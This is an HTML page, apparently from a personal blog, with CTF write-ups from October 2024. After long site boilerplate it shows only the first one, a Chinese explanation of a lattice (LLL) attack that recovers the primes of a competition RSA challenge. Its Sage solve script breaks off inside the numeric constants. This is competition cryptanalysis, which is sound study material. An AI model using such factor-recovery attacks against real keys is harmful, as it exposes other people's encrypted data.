@@ -1,0 +1,1719 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>2024_10 &middot; #cd /home</title>
+  <meta name="title" content="2024_10 &middot; #cd /home" />
+  
+  
+  <meta name="keywords" content="crypto, math, bin, " />
+  
+  
+  <link rel="canonical" href="https://ljahum.github.io/articles/2024_10/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.8d8ef9f406ae76aa0753f63221ea827aba6a09e5f22e065eb881e526880c7ba14c4c2c42e95cfee0b865d249aa0330266c5f7f926ce6e6218640879361dc8179.css"
+    integrity="sha512-jY759AaudqoHU/YyIeqCerpqCeXyLgZeuIHlJogMe6FMTCxC6Vz&#43;4Lhl0kmqAzAmbF9/kmzm5iGGQIeTYdyBeQ==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.cfe7a5826ca891c0d4396747d37fe961dd1e874835dfe591dd8962a103a8c837840acbe40df492814ea34a1e888ec717b3a505bf2765e3f1eafaab2daf157c1c.js"
+    integrity="sha512-z&#43;elgmyokcDUOWdH03/pYd0eh0g13&#43;WR3YlioQOoyDeECsvkDfSSgU6jSh6IjscXs6UFvydl4/Hq&#43;qstrxV8HA==" data-copy="" data-copied=""></script>
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="2024_10" />
+<meta property="og:description" content="华子杯CTF2024 # Crypto # real_rsa_2 # DownUnderCTF 2023 原题 apbq rsa 的part2" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ljahum.github.io/articles/2024_10/" /><meta property="og:image" content="https://ljahum.github.io/articles/2024_10/featured.png" /><meta property="article:section" content="articles" />
+<meta property="article:published_time" content="2024-10-31T13:23:11+00:00" />
+<meta property="article:modified_time" content="2024-10-31T13:23:11+00:00" />
+
+
+  <meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://ljahum.github.io/articles/2024_10/featured.png" /><meta name="twitter:title" content="2024_10"/>
+<meta name="twitter:description" content="华子杯CTF2024 # Crypto # real_rsa_2 # DownUnderCTF 2023 原题 apbq rsa 的part2"/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Projects",
+    "name": "2024_10",
+    "headline": "2024_10",
+    
+    "abstract": "华子杯CTF2024 # Crypto # real_rsa_2 # DownUnderCTF 2023 原题 apbq rsa 的part2",
+    "inLanguage": "en",
+    "url" : "https:\/\/ljahum.github.io\/articles\/2024_10\/",
+    "author" : {
+      "@type": "Person",
+      "name": "ベーコン"
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-10-31T13:23:11\u002b00:00",
+    "datePublished": "2024-10-31T13:23:11\u002b00:00",
+    
+    "dateModified": "2024-10-31T13:23:11\u002b00:00",
+    
+    "keywords": ["crypto","math","bin"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2007"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="ベーコン" />
+  
+  
+  
+  <link href="https://github.com/ljahum" rel="me" />
+  
+  
+  <link href="mailto:roomoflja@gmail.com" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+<link type="text/css" rel="stylesheet" href="/lib/katex/katex.min.592c8b7a7688e9109d57085ab360cfe8a07ae3571d5bffc0ade9f1bd1cebf69d834df38f0d677aae628057d7a18895457260343c214ae3dd8fe90b0ba0921a56.css" integrity="sha512-WSyLenaI6RCdVwhas2DP6KB641cdW//ArenxvRzr9p2DTfOPDWd6rmKAV9ehiJVFcmA0PCFK492P6QsLoJIaVg==" />
+
+
+<script defer src="/lib/katex/katex.min.6a864286ffbc8a663f5353bb2881d7bcef3b10ecc2b8a3b41a116da43e86d82ca3a3fc4f79381d7f7fdb721075d2207e0288cc4c390c1c33cb28dc4f255a8373.js" integrity="sha512-aoZChv&#43;8imY/U1O7KIHXvO87EOzCuKO0GhFtpD6G2Cyjo/xPeTgdf3/bchB10iB&#43;AojMTDkMHDPLKNxPJVqDcw=="></script>
+
+
+<script defer src="/lib/katex/auto-render.min.8968ae052e67b7aafad1f0b3dba35dd19a9ed276e4d594c841b9772afee462c5fec8a314147ce3687dbe02733abe9d97b3e80d99a0405562634a6b8fc3be847e.js" integrity="sha512-iWiuBS5nt6r60fCz26Nd0Zqe0nbk1ZTIQbl3Kv7kYsX&#43;yKMUFHzjaH2&#43;AnM6vp2Xs&#43;gNmaBAVWJjSmuPw76Efg=="
+  onload="renderMathInElement(document.body);"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">#cd /home</a>
+
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/articles/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Projects">
+        Articles
+    </p>
+</a>
+
+
+            
+            
+  <a href="/about/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="About">
+        About
+    </p>
+</a>
+
+
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  href="/achieve/"   class="text-base font-medium text-gray-500 hover:text-gray-900" title="archive">
+      Archive
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/categories/"  class="flex items-center">
+          
+          <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="Categories">
+            Categories
+          </p>
+        </a>
+        
+        <a href="/tags/"  class="flex items-center">
+          
+          <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="Tags">
+            Tags
+          </p>
+        </a>
+        
+        <a href="https://ljahum.notion.site/Bass-Ment-073326638a86449c9a06d6467fed470f?pvs=4" 
+          target="_blank"  class="flex items-center">
+          
+          <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
+            Notion
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400 h-12"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button">
+                    <div class="flex items-center justify-center h-12 dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden h-12 dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" style="margin-right:5px">
+                <div class="flex items-center justify-center h-12 dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden h-12 dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/articles/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Projects">
+            Articles
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="About">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                     
+  <li class="mt-1">
+    <a class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="archive">
+            Archive
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/categories/"  class="flex items-center">
+        
+        <p class="text-sm font-small text-gray-500 hover:text-gray-900" title="Categories">
+            Categories
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/tags/"  class="flex items-center">
+        
+        <p class="text-sm font-small text-gray-500 hover:text-gray-900" title="Tags">
+            Tags
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="https://ljahum.notion.site/Bass-Ment-073326638a86449c9a06d6467fed470f?pvs=4"  target="_blank"  class="flex items-center">
+        
+        <p class="text-sm font-small text-gray-500 hover:text-gray-900" title="">
+            Notion
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+                    
+                    
+
+                </ul>
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+  
+  
+  
+  
+  
+
+
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/articles/2024_10/featured.png);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+  
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      2024_10
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  &lt;time datetime=&#34;2024-10-31 13:23:11 &amp;#43;0000 UTC&#34;&gt;31 October 2024&lt;/time&gt;&lt;span class=&#34;px-2 text-primary-500&#34;&gt;&amp;middot;&lt;/span&gt;&lt;span&gt;2007 words&lt;/span&gt;&lt;span class=&#34;px-2 text-primary-500&#34;&gt;&amp;middot;&lt;/span&gt;&lt;span title=&#34;Reading time&#34;&gt;10 mins&lt;/span&gt;
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+  
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#华子杯ctf2024">华子杯CTF2024</a></li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#real_rsa_2">real_rsa_2</a></li>
+        <li><a href="#insecure_padding">insecure_padding</a></li>
+        <li><a href="#ez_rsa_5">EZ_RSA_5</a></li>
+        <li><a href="#ezhtml">ezhtml</a></li>
+        <li><a href="#kernel-network">kernel-network</a></li>
+      </ul>
+    </li>
+    <li><a href="#网鼎初赛-2024">网鼎初赛 2024</a>
+      <ul>
+        <li><a href="#re1">re1</a></li>
+        <li><a href="#crypto1">crypto1</a></li>
+        <li><a href="#pwn2">pwn2</a></li>
+      </ul>
+    </li>
+    <li><a href="#go-on">go on</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#华子杯ctf2024">华子杯CTF2024</a></li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#real_rsa_2">real_rsa_2</a></li>
+        <li><a href="#insecure_padding">insecure_padding</a></li>
+        <li><a href="#ez_rsa_5">EZ_RSA_5</a></li>
+        <li><a href="#ezhtml">ezhtml</a></li>
+        <li><a href="#kernel-network">kernel-network</a></li>
+      </ul>
+    </li>
+    <li><a href="#网鼎初赛-2024">网鼎初赛 2024</a>
+      <ul>
+        <li><a href="#re1">re1</a></li>
+        <li><a href="#crypto1">crypto1</a></li>
+        <li><a href="#pwn2">pwn2</a></li>
+      </ul>
+    </li>
+    <li><a href="#go-on">go on</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="max-w-prose mb-20">
+          
+
+<div id="华子杯ctf2024" class="anchor"></div>
+<h2 class="relative group">华子杯CTF2024 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%e5%8d%8e%e5%ad%90%e6%9d%afctf2024" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<div id="crypto" class="anchor"></div>
+<h2 class="relative group">Crypto 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#crypto" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<div id="real_rsa_2" class="anchor"></div>
+<h3 class="relative group">real_rsa_2 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#real_rsa_2" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>DownUnderCTF 2023 原题 apbq rsa 的part2</p>
+<p><a href="https://blog.maple3142.net/2023/09/03/downunderctf-2023-writeups/#apbq-rsa-ii"   target="_blank">
+    https://blog.maple3142.net/2023/09/03/downunderctf-2023-writeups/#apbq-rsa-ii</a></p>
+<p>联合三个式子把 p,q 消去</p>
+<p>用 LLL 把(𝑎1𝑎3𝑏2 − 𝑎1𝑎2𝑏3, −𝑎1𝑎3𝑏1 + 𝑎12𝑏3, 𝑎1𝑎2𝑏1 − 𝑎12𝑏2)规约出来</p>
+<p>记为t u v</p>
+<p>因为LLL所以可能还有正负号的问题要爆，不过这个好处理。总之我们可以拿六个未知数ai bi和t u v 求groebner basis，发现说里面有两个等式：</p>
+<p>𝑘1𝑎1 + 𝑘2𝑎2 + 𝑘3𝑎3 = 0</p>
+<p>𝑘1𝑏1 + 𝑘2𝑏2 + 𝑘3𝑏3 = 0</p>
+<p>所以拿ki做LLL再小爆一下就是ai bi了，之后就和前一题一样gcd搞定</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sage.all</span> <span class="kn">import</span> <span class="o">*</span> 
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getPrime</span><span class="p">,</span> <span class="n">bytes_to_long</span> 
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randint</span> 
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span><span class="p">,</span> <span class="n">combinations</span> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">10762816985859495139869192967586986169700585407650401758492914432007691215829829791170341055156952976765180258893167491520857418187717684546804091210840024146052291097940830614742073364552838290223328178129141450654974155663740167060363586046667418448000998787456156206763022665332848878718353207304752459866785987037244104966604168107428925002453961599326527075890562706405965932261029119740876890925151892381057306445871753182344654732310415856215026583156200205190290229513783502698870703593936084079889610093661632981253566737244298490483887491349685327054110713416608442026862452848911878315454050801737258113439</span> 
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">8447423691845267507910623881220381551666985692061130076228863364484545883136565538153853576456124232843440600389531458361591643000579120508101213567369995084232851488318213585166763995128971205060742692924173515480605390369108788114163397502997675308466114417550035850225404358223296655286051772334268473129000095354558509683438282602907669640723660576086897314122077227840018348574919569323961412521005657567879672836500813700075919902705930777791052105528663343979204155473143542923352804010273593743826083253263605472374027833649945128024719518687833938452374975314769405521418020888003402906733694105525873475248</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">hints</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1037185901048299733994080148617255395054343048856247908410601987778479809878530408488320575174117338778636437390189707472850545495340030261432470823966833296599326227471363743571435638488350843501335163114522221236295887873384511904404076136719828753484908833522690485308801343692672087896916151728355339557063865979845334871596911380941183991996355328789626661832721727696996294542137065146082233136253</span><span class="p">,</span><span class="mi">846732177805839592702453549495036743295384625187602625155533672143689218095451041579929817175558384214705957953439776505091441694232911111216302515231684660931114920885206001996415471667166302864276782382471749478878838743894218008585118570123564743506751263851346701898521514512630773037841739309871594639329517489797555801372814456505858967177535379362107863024397586339230559713504606369217391562005</span><span class="p">,</span><span 